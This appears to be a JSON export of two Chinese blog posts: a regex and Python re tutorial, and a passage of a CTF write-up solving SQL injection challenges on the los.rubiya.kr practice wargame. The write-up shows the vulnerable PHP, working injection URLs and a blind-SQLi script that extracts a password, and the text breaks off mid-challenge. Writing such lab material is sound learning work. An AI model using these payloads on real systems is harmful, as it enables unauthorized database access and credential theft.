[{"title":"正则表达式复习","url":"http://blog.le31ei.top/2020/11/24/正则表达式复习/","content":"<h1 id=\"0x01-基本语法\"><a href=\"#0x01-基本语法\" class=\"headerlink\" title=\"0x01 基本语法\"></a>0x01 基本语法</h1><p><strong>修饰符（g i m）</strong></p>\n<ul>\n<li>g：global表示全局匹配</li>\n<li>i：ignore case表示忽略大小写匹配</li>\n<li>m：multiple line多行匹配</li>\n</ul>\n<p><strong>元字符</strong></p>\n<ul>\n<li><code>.</code>：匹配除换行符以外的任意字符</li>\n<li><code>\\w</code>：匹配字母、数字、下划线、汉字</li>\n<li><code>\\s</code>：匹配任意空白字符</li>\n<li><code>\\d</code>：匹配数字</li>\n<li><code>\\b</code>：匹配单词的开始或者结束</li>\n<li><code>^</code>：匹配字符的开始</li>\n<li><code>$</code>：匹配字符的结束</li>\n</ul>\n<p><strong>重复</strong></p>\n<ul>\n<li><code>*</code>：重复0次或者多次</li>\n<li><code>+</code>：重复1次或者多次</li>\n<li><code>?</code>：重复0次或者1次</li>\n<li><code>&#123;n&#125;</code>：重复n次</li>\n<li><code>&#123;n,&#125;</code>：重复n次到多次</li>\n<li><code>&#123;n,m&#125;</code>：重复n到m次</li>\n</ul>\n<p><strong>字符类</strong></p>\n<p><code>[]</code>：匹配中括号中的任意一个字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[abc]：匹配abc任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><strong>反义</strong></p>\n<p><code>[^]</code>：不包含中括号中的任意一个字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[^abc]：不包含abc任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><code>\\W</code>：除\\w意外的任意字符</p>\n<p><code>\\S</code>：匹配任意不是空白符的字符</p>\n<p><code>\\D</code>：匹配任意非数字的字符</p>\n<p><code>\\B</code>：匹配不是单词开头或结束的位置</p>\n<p>范围类**</p>\n<p><code>[a-z]、[A-Z]、[0-9]</code>：匹配范围内的任意一个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[a-zA-Z0-9]：匹配范围中的任意一个字符</span><br></pre></td></tr></table></figure>\n\n<p><strong>贪婪与非贪婪</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">s = re.search(<span class=\"string\">&quot;\\d&#123;3,6&#125;&quot;</span>,<span class=\"string\">&#x27;123456789&#x27;</span>)</span><br><span class=\"line\">print(s.group())</span><br><span class=\"line\"><span class=\"comment\"># output: 123456</span></span><br><span class=\"line\"><span class=\"comment\"># 贪婪模式匹配最多的情况</span></span><br><span class=\"line\"></span><br><span class=\"line\">s = re.search(<span class=\"string\">&quot;\\d&#123;3,6&#125;?&quot;</span>,<span class=\"string\">&#x27;123456789&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># output: 123，后面加个问号，非贪婪模式，匹配最小3个的情况</span></span><br><span class=\"line\"></span><br><span class=\"line\">a.*?b： 匹配最短的，以a开始，以b结尾的字符串</span><br></pre></td></tr></table></figure>\n\n<p><strong>分组</strong></p>\n<p><code>abc&#123;2&#125;</code>：不分组，只重复最后一个字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;abc&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">AttributeError: <span class=\"string\">&#x27;NoneType&#x27;</span> <span class=\"built_in\">object</span> has no attribute <span class=\"string\">&#x27;group&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;abc&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcc</span><br></pre></td></tr></table></figure>\n\n<p><code>(abc)&#123;2&#125;</code>：重复abc两次</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;(abc)&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcabc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcabc</span><br></pre></td></tr></table></figure>\n\n<p>用小括号指定一个表达式后，每个分组自动拥有一个组号，从1开始编号。</p>\n<p><code>\\b(\\w+)\\b\\s+\\1\\b</code>：可以匹配两个空格间隔的单词，如，<code>go go</code></p>\n<p><code>\\b(?&lt;Word&gt;\\w+)\\b\\s+\\k&lt;Word&gt;\\b</code>：可以使用组名来替代组的编号</p>\n<p><strong>零宽断言</strong></p>\n<p>用于查找某些内容，但又不占用这个位置，称为零宽断言。</p>\n<p><code>(?=exp)</code>：比如<code>\\b\\w+(?=ing)\\b</code>可以匹配以ing结尾的前面部分，如<code>dancing</code>会匹配danc</p>\n<p><code>(?&lt;=exp)</code>：比如<code>(?&lt;=\\bre)\\w+\\b</code>可以匹配re开头的单词的后半部分，如<code>reading</code>会匹配ading</p>\n<p><strong>负向零宽断言</strong></p>\n<p>表示某个字符或者某个字符串不在里面的方法，类似于<code>[^abc]</code>，但这种方式只能判断单个字符，如果表示字符串不包含<code>abc</code>整体，则要用到负向零宽断言</p>\n<p><code>(?!exp)</code>：<code>\\b((?!abc)\\w)+</code>表示不包含abc连续字符的单词</p>\n<h1 id=\"0x02-python-re模块\"><a href=\"#0x02-python-re模块\" class=\"headerlink\" title=\"0x02 python re模块\"></a>0x02 python re模块</h1><p><code>re.compile(pattern, flags=0)</code>：编译正则表达式为一个对象，flag为标记为，可以使用<code>|</code>进行结合，可能的值有如下几种：</p>\n<p><code>re.A</code>、<code>re.ASCII</code>：让<code>\\w</code> <code>\\W</code> <code>\\b</code> <code>\\B</code> <code>\\D</code> <code>\\d</code> <code>s</code> <code>\\S</code>只匹配ASCII，忽略unicode</p>\n<p><code>re.I</code>、<code>re.IGNORECASE</code>：忽略匹配大小写</p>\n<p><code>re.M</code>、<code>re.MULTILINE</code>：匹配多行字符</p>\n<p><strong>常用函数</strong></p>\n<p><code>re.search(pattern, string, flag=0)</code>：扫描整个字符串，匹配到第一个就返回，并返回一个匹配对象，没有匹配返回None</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.search(<span class=\"string\">&quot;(abc)&#123;2&#125;&quot;</span>,<span class=\"string\">&#x27;abcabc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abcabc</span><br></pre></td></tr></table></figure>\n\n<p><code>re.match(pattern, string, flag=0)</code>：从字符串开头进行匹配，并返回一个匹配对象，没有匹配返回None</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.match(<span class=\"string\">&quot;abc\\d+&quot;</span>, <span class=\"string\">&quot;abc1&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">abc1</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.match(<span class=\"string\">&quot;abc\\d+&quot;</span>, <span class=\"string\">&quot;12312abc1&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s.group())</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">AttributeError: <span class=\"string\">&#x27;NoneType&#x27;</span> <span class=\"built_in\">object</span> has no attribute <span class=\"string\">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>re.split(pattern, string, maxsplit=0, flags=0)</code>：用正则去分割字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.split(<span class=\"string\">&#x27;[a-f]+&#x27;</span>, <span class=\"string\">&#x27;a1b2321c912d9&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s)</span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2321&#x27;</span>, <span class=\"string\">&#x27;912&#x27;</span>, <span class=\"string\">&#x27;9&#x27;</span>]  <span class=\"comment\"># 如果字符串第一个匹配成功，list第一位为空</span></span><br></pre></td></tr></table></figure>\n\n<p><code>re.findalll(pattern, string, flags=0)</code>：将匹配到的返回一个列表组合</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.findall(<span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&quot;abcskodqwabcjiabc&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s)</span><br><span class=\"line\">[<span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&#x27;abc&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<p><strong>分组</strong></p>\n<p>如果正则中有括号进行分组，可以用group加上编号进行读取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = re.match(<span class=\"string\">r&quot;(\\w+) (\\w+)&quot;</span>, <span class=\"string\">&quot;Isaac Newton, physicist&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Isaac Newton&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Isaac&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Newton&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>分组号有名称</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = re.match(<span class=\"string\">r&quot;(?P&lt;first_name&gt;\\w+) (?P&lt;last_name&gt;\\w+)&quot;</span>, <span class=\"string\">&quot;Malcolm Reynolds&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"string\">&#x27;first_name&#x27;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Malcolm&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"string\">&#x27;last_name&#x27;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Reynolds&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><a href=\"https://deerchao.cn/tutorials/regex/regex.htm\">https://deerchao.cn/tutorials/regex/regex.htm</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000013075245\">https://segmentfault.com/a/1190000013075245</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000000426455\">https://segmentfault.com/a/1190000000426455</a></li>\n<li><a href=\"https://regexper.com/#\">正则表达式图形化分析工具</a></li>\n</ol>\n","categories":["Program"],"tags":["正则"]},{"title":"rubiya注入题目writeup","url":"http://blog.le31ei.top/2020/11/19/rubiya注入题目writeup/","content":"<p>最近复习注入，便找了许多ctf题目来做，这个题目一共48道注入题，记录一下解题过程。</p>\n<p>平台地址为：<a href=\"https://los.rubiya.kr/\">https://los.rubiya.kr/</a></p>\n<h1 id=\"1-gremlin\"><a href=\"#1-gremlin\" class=\"headerlink\" title=\"1. gremlin\"></a>1. gremlin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>;</span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); <span class=\"comment\">// do not try to attack another table, database!</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_gremlin where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;gremlin&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>这道题很简单，最基础的注入。</p>\n<p><code>https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1%27+or+%271%27--+</code></p>\n<h1 id=\"2-cobolt\"><a href=\"#2-cobolt\" class=\"headerlink\" title=\"2. cobolt\"></a>2. cobolt</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_cobolt where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;cobolt&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">elseif</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=a%27+union+select+%27admin%27--+</code></p>\n<h1 id=\"3-goblin\"><a href=\"#3-goblin\" class=\"headerlink\" title=\"3. goblin\"></a>3. goblin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|\\&quot;|\\`/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Quotes ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;goblin&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了单引号，只需要将no参数转换为16进制即可</p>\n<p><code>https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=-2+union+select+0x61646d696e--+</code></p>\n<h1 id=\"4-orc\"><a href=\"#4-orc\" class=\"headerlink\" title=\"4.orc\"></a>4.orc</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;orc&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>对pw进行了addslashed过滤，无法进行绕过，需要在注入点进行盲注，写了个脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;xxxx&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;123&#x27;+or+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>注入出来pw的值为<code>095a9852</code>，传入该值，即可通关</p>\n<h1 id=\"5-Walfman\"><a href=\"#5-Walfman\" class=\"headerlink\" title=\"5. Walfman\"></a>5. Walfman</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/ /i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No whitespace ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span 